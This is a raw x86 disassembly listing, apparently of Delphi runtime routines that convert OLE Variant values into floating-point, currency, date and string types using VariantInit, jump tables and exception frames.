push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx eax
lea eax [ ebp - 0x18 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_410ba9
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x18 ]
call sub_40efa0
lea eax [ ebp - 0x18 ]
call [ rw-data ]
lea eax [ ebp - 0x18 ]
call sub_410c04
fstp [ ebp - 0x8 ]
fwait
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410bb0
lea eax [ ebp - 0x18 ]
call sub_40ec78
retn
sub_410bb8
push ebx
push esi
push edi
add esp 0xffffffec
mov edi edx
mov esi eax
mov edx esp
mov ax [ esi ]
call sub_41418c
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
add esp 0x14
pop edi
pop esi
pop ebx
retn
lea eax [ esp + 0x4 ]
push eax
call VariantInit
push 0x5
mov ecx esi
lea edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
mov esi [ eax ]
call [ esi + 0x1c ]
mov eax [ esp + 0xc ]
mov [ edi ] eax
mov eax [ esp + 0x10 ]
mov [ edi + 0x4 ] eax
sub_410c04
push ebx
add esp 0xffffffec
mov ebx eax
mov ax [ ebx ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_410c20 ]
mov eax ebx
call sub_410a44
fstp [ esp ]
fwait
jmp r-xdata
dec dx
je r-xdata
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] eax
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
fild [ ebx + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
fild [ ebx + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
fld [ ebx + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov [ esp ] eax
mov eax [ ebx + 0xc ]
mov [ esp + 0x4 ] eax
jmp r-xdata
fild [ ebx + 0x8 ]
fdiv [ r-xdata ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov [ esp ] eax
mov eax [ ebx + 0xc ]
mov [ esp + 0x4 ] eax
jmp r-xdata
mov eax ebx
call sub_410a44
fstp [ esp ]
fwait
jmp r-xdata
movsx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
movsx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
xor eax eax
mov al [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
movzx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov [ esp + 0xc ] eax
xor eax eax
mov [ esp + 0x10 ] eax
fild [ esp + 0xc ]
fstp [ esp ]
fwait
jmp r-xdata
fild [ ebx + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
call sub_410c04
fstp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_410b08
fstp [ esp ]
fwait
jmp r-xdata
fld [ esp ]
add esp 0x14
pop ebx
retn
mov eax ebx
call sub_410b54
fstp [ esp ]
fwait
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] eax
jmp r-xdata
mov dx 0x5
mov ax 0x1
call sub_40e440
test ah 0x40
je r-xdata
mov edx esp
mov eax ebx
call sub_410bb8
test al al
jne r-xdata
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
mov eax ebx
call sub_410b08
fstp [ esp ]
fwait
mov eax ebx
call sub_410b08
fstp [ esp ]
fwait
jmp r-xdata
jmp [ eax * 4 + jump_table_410dfd ]
mov eax [ ebx + 0x8 ]
fild [ eax ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx [ eax ]
mov [ esp ] edx
mov edx [ eax + 0x4 ]
mov [ esp + 0x4 ] edx
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
fdiv [ r-xdata ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx [ eax ]
mov [ esp ] edx
mov edx [ eax + 0x4 ]
mov [ esp + 0x4 ] edx
jmp r-xdata
mov eax ebx
call sub_410a44
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
mov [ esp + 0xc ] eax
xor eax eax
mov [ esp + 0x10 ] eax
fild [ esp + 0xc ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
call sub_410c04
fstp [ esp ]
fwait
jmp r-xdata
sub_410f9c
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax ]
cmp eax 0x14
ja r-xdata
xor eax eax
push ebp
push sub_411101
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_410c04
fstp [ ebp - 0x8 ]
fwait
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
jmp [ eax * 4 + jump_table_410fbe ]
fld [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor eax eax
mov [ ebp - 0x8 ] eax
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
fild [ eax + 0x8 ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov eax [ ebp - 0x4 ]
fild [ eax + 0x8 ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
fild [ ebp - 0xc ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
fild [ ebp - 0xc ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
fild [ ebp - 0xc ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
fild [ ebp - 0xc ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x14 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
fild [ ebp - 0x14 ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov eax [ ebp - 0x4 ]
fild [ eax + 0x8 ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov dx 0x4
mov ax 0x1
call sub_40e440
sub_41112c
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
xor edx edx
mov [ ebp - 0x20 ] edx
mov [ ebp - 0x1c ] edx
mov [ ebp - 0xc ] edx
mov ebx eax
xor eax eax
push ebp
push sub_411208
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0xc ]
call sub_4126b8
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x400
mov eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
sub edx 0x80020005
je r-xdata
lea eax [ ebp - 0x1c ]
mov edx [ ebp - 0xc ]
call sub_404270
mov eax [ ebp - 0x1c ]
lea edx [ ebp - 0x8 ]
call sub_40ad60
test al al
jne r-xdata
sub edx 0x7ffdfffb
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41120f
lea eax [ ebp - 0x20 ]
mov edx 0x2
call sub_40400c
lea eax [ ebp - 0xc ]
call sub_4046c8
retn
lea eax [ ebp - 0x20 ]
mov edx [ ebp - 0xc ]
call sub_404270
mov eax [ ebp - 0x20 ]
lea edx [ ebp - 0x18 ]
call sub_409550
test al al
je r-xdata
mov dx [ ebx ]
mov cx 0x7
call sub_40e8d4
jmp r-xdata
mov dx [ ebx ]
mov cx 0x7
mov eax 0x80020005
call sub_40e8d4
jmp r-xdata
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
sub_411218
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx eax
lea eax [ ebp - 0x18 ]
push eax
call VariantInit
mov [ ebp - 0x18 ] 0x5
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] eax
push 0x7
push 0x0
push 0x400
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x7
call sub_40e8d4
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x4 ] eax
fld [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_411278
push ebx
add esp 0xffffffe8
mov ebx eax
lea eax [ esp + 0x8 ]
push eax
call VariantInit
push 0x7
push 0x0
push 0x400
push ebx
lea eax [ esp + 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x7
call sub_40e8d4
mov eax [ esp + 0x10 ]
mov [ esp ] eax
mov eax [ esp + 0x14 ]
mov [ esp + 0x4 ] eax
fld [ esp ]
add esp 0x18
pop ebx
retn
sub_4112c4
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx eax
lea eax [ ebp - 0x18 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_411319
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x18 ]
call sub_40efa0
lea eax [ ebp - 0x18 ]
call [ rw-data ]
lea eax [ ebp - 0x18 ]
call sub_411374
fstp [ ebp - 0x8 ]
fwait
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_411320
lea eax [ ebp - 0x18 ]
call sub_40ec78
retn
sub_411328
push ebx
push esi
push edi
add esp 0xffffffec
mov edi edx
mov esi eax
mov edx esp
mov ax [ esi ]
call sub_41418c
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
add esp 0x14
pop edi
pop esi
pop ebx
retn
lea eax [ esp + 0x4 ]
push eax
call VariantInit
push 0x7
mov ecx esi
lea edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
mov esi [ eax ]
call [ esi + 0x1c ]
mov eax [ esp + 0xc ]
mov [ edi ] eax
mov eax [ esp + 0x10 ]
mov [ edi + 0x4 ] eax
sub_411374
push ebx
add esp 0xffffffec
mov ebx eax
mov ax [ ebx ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_411390 ]
mov eax ebx
call sub_41112c
fstp [ esp ]
fwait
jmp r-xdata
dec dx
je r-xdata
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] eax
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
fild [ ebx + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
fild [ ebx + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_411278
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov [ esp ] eax
mov eax [ ebx + 0xc ]
mov [ esp + 0x4 ] eax
jmp r-xdata
mov eax ebx
call sub_41112c
fstp [ esp ]
fwait
jmp r-xdata
movsx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
movsx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
xor eax eax
mov al [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
movzx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov [ esp + 0xc ] eax
xor eax eax
mov [ esp + 0x10 ] eax
fild [ esp + 0xc ]
fstp [ esp ]
fwait
jmp r-xdata
fild [ ebx + 0x8 ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax ebx
call sub_411218
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
call sub_411374
fstp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_411278
fstp [ esp ]
fwait
jmp r-xdata
fld [ esp ]
add esp 0x14
pop ebx
retn
mov eax ebx
call sub_4112c4
fstp [ esp ]
fwait
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] eax
jmp r-xdata
mov dx 0x7
mov ax 0x1
call sub_40e440
test ah 0x40
je r-xdata
mov edx esp
mov eax ebx
call sub_411328
test al al
jne r-xdata
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
mov eax ebx
call sub_411278
fstp [ esp ]
fwait
mov eax ebx
call sub_411278
fstp [ esp ]
fwait
jmp r-xdata
jmp [ eax * 4 + jump_table_41155b ]
mov eax [ ebx + 0x8 ]
fild [ eax ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_411278
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx [ eax ]
mov [ esp ] edx
mov edx [ eax + 0x4 ]
mov [ esp + 0x4 ] edx
jmp r-xdata
mov eax ebx
call sub_41112c
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
mov [ esp + 0xc ] eax
xor eax eax
mov [ esp + 0x10 ] eax
fild [ esp + 0xc ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax ebx
call sub_411218
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
call sub_411374
fstp [ esp ]
fwait
jmp r-xdata
sub_4116c4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor edx edx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0xc ] edx
mov ebx eax
xor eax eax
push ebp
push sub_411770
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0xc ]
call sub_4126b8
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x400
mov eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
sub edx 0x80020005
je r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
call sub_404270
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0x8 ]
call sub_4095a8
test al al
jne r-xdata
sub edx 0x7ffdfffb
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_411777
lea eax [ ebp - 0x10 ]
call sub_403fe8
lea eax [ ebp - 0xc ]
call sub_4046c8
retn
mov dx [ ebx ]
mov cx 0x6
mov eax 0x80020005
call sub_40e8d4
jmp r-xdata
mov dx [ ebx ]
mov cx 0x6
call sub_40e8d4
jmp r-xdata
sub_411780
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx eax
lea eax [ ebp - 0x18 ]
push eax
call VariantInit
mov [ ebp - 0x18 ] 0x5
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] eax
push 0x6
push 0x0
push 0x400
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x6
call sub_40e8d4
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x4 ] eax
fild [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_4117e0
push ebx
add esp 0xffffffe8
mov ebx eax
lea eax [ esp + 0x8 ]
push eax
call VariantInit
push 0x6
push 0x0
push 0x400
push ebx
lea eax [ esp + 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x6
call sub_40e8d4
mov eax [ esp + 0x10 ]
mov [ esp ] eax
mov eax [ esp + 0x14 ]
mov [ esp + 0x4 ] eax
fild [ esp ]
add esp 0x18
pop ebx
retn
sub_41182c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx eax
lea eax [ ebp - 0x18 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_411881
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x18 ]
call sub_40efa0
lea eax [ ebp - 0x18 ]
call [ rw-data ]
lea eax [ ebp - 0x18 ]
call sub_4118dc
fistp [ ebp - 0x8 ]
fwait
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_411888
lea eax [ ebp - 0x18 ]
call sub_40ec78
retn
sub_411890
push ebx
push esi
push edi
add esp 0xffffffec
mov edi edx
mov esi eax
mov edx esp
mov ax [ esi ]
call sub_41418c
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
add esp 0x14
pop edi
pop esi
pop ebx
retn
lea eax [ esp + 0x4 ]
push eax
call VariantInit
push 0x6
mov ecx esi
lea edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
mov esi [ eax ]
call [ esi + 0x1c ]
mov eax [ esp + 0xc ]
mov [ edi ] eax
mov eax [ esp + 0x10 ]
mov [ edi + 0x4 ] eax
sub_4118dc
push ebx
add esp 0xffffffec
mov ebx eax
mov ax [ ebx ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_4118f8 ]
mov eax ebx
call sub_4116c4
fistp [ esp ]
fwait
jmp r-xdata
dec dx
je r-xdata
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] eax
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
fild [ ebx + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
fild [ ebx + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_4117e0
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov [ esp ] eax
mov eax [ ebx + 0xc ]
mov [ esp + 0x4 ] eax
jmp r-xdata
mov eax ebx
call sub_4117e0
fistp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_4116c4
fistp [ esp ]
fwait
jmp r-xdata
movsx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
movsx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
xor eax eax
mov al [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
movzx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov [ esp + 0xc ] eax
xor eax eax
mov [ esp + 0x10 ] eax
fild [ esp + 0xc ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
fild [ ebx + 0x8 ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax ebx
call sub_411780
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
call sub_4118dc
fistp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_4117e0
fistp [ esp ]
fwait
jmp r-xdata
fild [ esp ]
add esp 0x14
pop ebx
retn
mov eax ebx
call sub_41182c
fistp [ esp ]
fwait
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] eax
jmp r-xdata
mov dx 0x6
mov ax 0x1
call sub_40e440
test ah 0x40
je r-xdata
mov edx esp
mov eax ebx
call sub_411890
test al al
jne r-xdata
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
mov eax ebx
call sub_4117e0
fistp [ esp ]
fwait
mov eax ebx
call sub_4117e0
fistp [ esp ]
fwait
jmp r-xdata
jmp [ eax * 4 + jump_table_411afd ]
mov eax [ ebx + 0x8 ]
fild [ eax ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_4117e0
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx [ eax ]
mov [ esp ] edx
mov edx [ eax + 0x4 ]
mov [ esp + 0x4 ] edx
jmp r-xdata
mov eax ebx
call sub_4117e0
fistp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_4116c4
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
mov [ esp + 0xc ] eax
xor eax eax
mov [ esp + 0x10 ] eax
fild [ esp + 0xc ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax ebx
call sub_411780
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
call sub_4118dc
fistp [ esp ]
fwait
jmp r-xdata
sub_411ca8
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax ebx
call sub_4046c8
push eax
push 0x0
push 0x400
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov cx 0x8
mov dx 0x6
call sub_40e8d4
pop ebx
pop ebp
retn 0x8
sub_411ce0
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax ebx
call sub_4046c8
push eax
push 0x0
push 0x400
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov cx 0x8
mov dx 0x7
call sub_40e8d4
pop ebx
pop ebp
retn 0x8
sub_411d18
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_411dce
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_4046c8
push eax
push 0x0
push 0x400
push esi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov cx 0x8
mov dx 0xb
call sub_40e8d4
mov al [ rw-data ]
sub al 0x1
jb r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_411dd5
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_40400c
retn
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ ebx ]
call sub_404270
mov eax [ ebp - 0x8 ]
lea edx [ ebp - 0x4 ]
call sub_407e00
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_404814
jmp r-xdata
dec al
je r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ ebx ]
call sub_404270
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
call sub_407dc4
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_404814
jmp r-xdata
jmp r-xdata
call sub_40e4dc
sub_411ddc
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x18 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_411e9b
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_411e79
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x8
push 0x0
push 0x400
push ebx
lea eax [ ebp - 0x10 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x100
call sub_40e8d4
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x18 ]
mov edx [ ebp - 0x8 ]
call sub_4047d8
mov eax [ ebp - 0x18 ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_4048c4
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_404270
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_411e80
lea eax [ ebp - 0x10 ]
call sub_40ec78
retn
sub_411ea8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_411efe
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x10 ]
call sub_40efa0
lea eax [ ebp - 0x10 ]
call [ rw-data ]
lea edx [ ebp - 0x10 ]
mov eax esi
call sub_411f90
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_411f05
lea eax [ ebp - 0x10 ]
call sub_40ec78
retn
sub_411f0c
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
lea edx [ ebp - 0xc ]
mov ax [ ebx ]
call sub_41418c
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor edx edx
mov [ eax ] edx
mov al [ ebp - 0x5 ]
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x1c ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_411f81
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x100
mov ecx ebx
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x14 ]
call sub_40403c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
